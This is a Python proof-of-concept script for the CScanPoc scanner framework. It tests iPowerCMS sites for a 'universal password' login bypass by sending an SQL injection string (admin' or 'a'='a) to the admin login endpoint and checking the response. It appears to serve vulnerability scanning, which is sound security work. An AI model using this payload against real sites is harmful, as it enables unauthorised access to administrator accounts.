# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'iPowerCMS_0001'  # 平台漏洞编号，留空
    name = '鼎维iPowerCMS建站CMS 万能密码'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-04-28'  # 漏洞公布时间
    desc = '''
        鼎维iPowerCMS建站CMS存在两处高危漏洞：建站弱口令、万能密码。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'iPowerCMS'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f887725f-44e6-4f87-ada9-21041c904dde'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer http://www.wooyun.org/bugs/wooyun-2010-0110152
            hh = hackhttp.hackhttp()
            payload = '/m/manager/login.xml.php?username=admin\'%20or%20\'a\'=\'a&password=123&vcode='
            code, head, res, errcode, _ = hh.http(self.target + payload)

            if code == 200 and '<v>1</v>' in res:
                #security_hole('万能密码 '+arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()